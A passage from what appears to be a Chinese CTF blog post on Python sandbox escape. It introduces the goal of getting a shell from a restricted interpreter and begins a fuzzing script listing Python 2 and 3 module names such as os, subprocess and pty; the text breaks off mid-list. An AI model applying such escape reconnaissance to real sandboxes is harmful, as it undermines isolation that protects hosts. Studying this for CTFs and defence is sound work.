<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>逃逸 | AsaL1n's blog</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="逃逸 记录各种逃逸的方式  1.python沙箱逃逸介绍在python的沙箱里面，会不允许使用一些函数，包括os等类，题目又要求我们从一个受限制的python环境里面getshell或者执行一些命令 首先是一个可以fuzz 沙箱里面过滤了什么的脚本 12345678910111213141516171819202122232425262728293031323334353637all_module">
<meta property="og:type" content="article">
<meta property="og:title" content="逃逸">
<meta property="og:url" content="https://asal1n.github.io/2023/10/12/%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="AsaL1n&#39;s blog">
<meta property="og:description" content="逃逸 记录各种逃逸的方式  1.python沙箱逃逸介绍在python的沙箱里面，会不允许使用一些函数，包括os等类，题目又要求我们从一个受限制的python环境里面getshell或者执行一些命令 首先是一个可以fuzz 沙箱里面过滤了什么的脚本 12345678910111213141516171819202122232425262728293031323334353637all_module">
<meta property="og:locale">
<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
<meta property="article:published_time" content="2023-10-11T16:00:00.000Z">
<meta property="article:modified_time" content="2023-10-31T08:03:34.060Z">
<meta property="article:author" content="AsaL1n">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2023/10/12/%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '逃逸',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-31 16:03:34'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="AsaL1n's blog"><span class="site-name">AsaL1n's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-11T16:00:00.000Z" title="Created 2023-10-12 00:00:00">2023-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-31T08:03:34.060Z" title="Updated 2023-10-31 16:03:34">2023-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h1><blockquote>
<p>记录各种逃逸的方式</p>
</blockquote>
<h2 id="1-python沙箱逃逸"><a href="#1-python沙箱逃逸" class="headerlink" title="1.python沙箱逃逸"></a>1.python沙箱逃逸</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在python的沙箱里面，会不允许使用一些函数，包括os等类，题目又要求我们从一个受限制的python环境里面getshell或者执行一些命令</p>
<p>首先是一个可以fuzz 沙箱里面过滤了什么的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">all_modules_2 = [</span><br><span class="line">    <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;CDROM&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;Canvas&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;DLFCN&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;Dialog&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;audioop&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;FileDialog&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;FixTk&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;linuxaudiodev&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;IN&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;lsb_release&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ScrolledText&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;SimpleDialog&#x27;</span>, <span class="string">&#x27;cPickle&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;cStringIO&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;TYPES&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;strop&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;Tkconstants&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;Tkdnd&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;Tkinter&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;mmap&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;talloc&#x27;</span>, <span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;nis&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;_bsddb&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;termios&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;_codecs_cn&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_codecs_hk&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;_codecs_iso2022&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;thread&#x27;</span>, <span class="string">&#x27;_codecs_jp&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;_codecs_kr&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_codecs_tw&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;ossaudiodev&#x27;</span>, <span class="string">&#x27;tkColorChooser&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;parser&#x27;</span>, <span class="string">&#x27;tkCommonDialog&#x27;</span>, <span class="string">&#x27;_ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;tkFileDialog&#x27;</span>, <span class="string">&#x27;_ctypes_test&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;tkFont&#x27;</span>, <span class="string">&#x27;_curses&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;tkMessageBox&#x27;</span>, <span class="string">&#x27;_curses_panel&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;tkSimpleDialog&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;_hashlib&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;_hotshot&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;ttk&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;exceptions&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;_lsprof&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;_multibytecodec&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;_multiprocessing&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;_sha&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;future_builtins&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;_sqlite3&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;_ssl&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;resource&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;_testcapi&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;sha&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_modules_3 = [</span><br><span class="line">    <span class="string">&#x27;AptUrl&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;requests_unixsocket&#x27;</span>, <span class="string">&#x27;CommandNotFound&#x27;</span>, <span class="string">&#x27;apport&#x27;</span>, <span class="string">&#x27;hpmudext&#x27;</span>, <span class="string">&#x27;resource&#x27;</span>, <span class="string">&#x27;Crypto&#x27;</span>, <span class="string">&#x27;apport_python_hook&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;DistUpgrade&#x27;</span>, <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;HweSupportStatus&#x27;</span>, <span class="string">&#x27;apt_inst&#x27;</span>, <span class="string">&#x27;httplib2&#x27;</span>, <span class="string">&#x27;scanext&#x27;</span>, <span class="string">&#x27;LanguageSelector&#x27;</span>, <span class="string">&#x27;apt_pkg&#x27;</span>, <span class="string">&#x27;idna&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;NvidiaDetector&#x27;</span>, <span class="string">&#x27;aptdaemon&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;PIL&#x27;</span>, <span class="string">&#x27;aptsources&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;secretstorage&#x27;</span>, <span class="string">&#x27;Quirks&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;UbuntuDrivers&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;UbuntuSystemService&#x27;</span>, <span class="string">&#x27;asn1crypto&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;UpdateManager&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;janitor&#x27;</span>, <span class="string">&#x27;simplejson&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;_blake2&#x27;</span>, <span class="string">&#x27;audioop&#x27;</span>, <span class="string">&#x27;keyring&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;six&#x27;</span>, <span class="string">&#x27;_bz2&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;language_support_pkgs&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;_cffi_backend&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;launchpadlib&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;_codecs_cn&#x27;</span>, <span 